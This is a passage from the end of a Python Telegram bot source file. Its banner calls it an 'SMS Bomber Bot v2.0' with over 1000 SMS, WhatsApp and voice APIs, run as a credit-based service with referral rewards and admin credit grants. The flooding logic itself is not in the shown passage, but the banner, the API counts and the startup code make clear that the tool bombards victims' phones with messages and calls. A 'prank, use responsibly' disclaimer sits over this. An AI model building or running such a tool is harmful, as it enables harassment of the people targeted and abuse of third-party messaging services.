                            f"{P_USER} ᴜꜱᴇʀ <b>{ref_name}</b> ᴊᴏɪɴᴇᴅ ᴜꜱɪɴɢ ʏᴏᴜʀ ʟɪɴᴋ!\n"
                            f"{P_GIFT} ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇᴅ <b>1 ᴄʀᴇᴅɪᴛ</b>! {P_HEART}\n\n{BRAND_NAME} | {DEV_NAME}",
                            parse_mode='HTML',
                        )
                    except Exception:
                        pass
        except Exception:
            pass
        time.sleep(30)

def print_banner():
    banner = rf"""
╔══════════════════════════════════════════════════════════╗
║     {BRAND_NAME}                                        
║     Developer: {DEV_NAME}                               
║                                                        
║     ███████╗███╗   ███╗███████╗    ██████╗  ██████╗ ████████╗
║     ██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔═══██╗╚══██╔══╝
║     ███████╗██╔████╔██║███████╗    ██████╔╝██║   ██║   ██║   
║     ╚════██║██║╚██╔╝██║╚════██║    ██╔══██╗██║   ██║   ██║   
║     ███████║██║ ╚═╝ ██║███████║    ██████╔╝╚██████╔╝   ██║   
║     ╚══════╝╚═╝     ╚═╝╚══════╝    ╚═════╝  ╚═════╝    ╚═╝   
║                                                        
║            ⚠️  Prank Service — Use Responsibly  ⚠️      
║         NOT for harassment or illegal activities        
║                                                        
║           {BRAND_NAME} — {DEV_NAME}                     
╚══════════════════════════════════════════════════════════╝
    """
    print(banner)
    total_apis = len(SMS_APIS) + len(WHATSAPP_APIS) + len(VOICE_APIS)
    print(f"⚡ Python SMS Bomber Bot v2.0 (Merged with 1000+ APIs)")
    print(f"📊 Total APIs loaded: {total_apis}")
    print(f"📱 SMS APIs: {len(SMS_APIS)}")
    print(f"📞 Voice APIs: {len(VOICE_APIS)}")
    print(f"💬 WhatsApp APIs: {len(WHATSAPP_APIS)}")
    print(f"{'='*60}\n")

# ==================== MAIN ====================
if __name__ == "__main__":
    print_banner()
    init_db()
    for admin_id in ADMIN_IDS:
        create_user(admin_id, "admin", "Admin")
        update_user_credits(admin_id, 9997)
    threading.Thread(target=check_referral_credits, daemon=True).start()
    print(f"🤖 Bot starting...")
    print(f"⚡ Bot username: @{bot.get_me().username}")
    print(f"👑 Admin IDs: {ADMIN_IDS}")
    print(f"📢 Channel: {CHANNEL_ID}")
    print(f"{'='*60}\n")
    try:
        bot.infinity_polling(skip_pending=True)
    except Exception as e:
        print(f"❌ Bot error: {e}")
        time.sleep(5)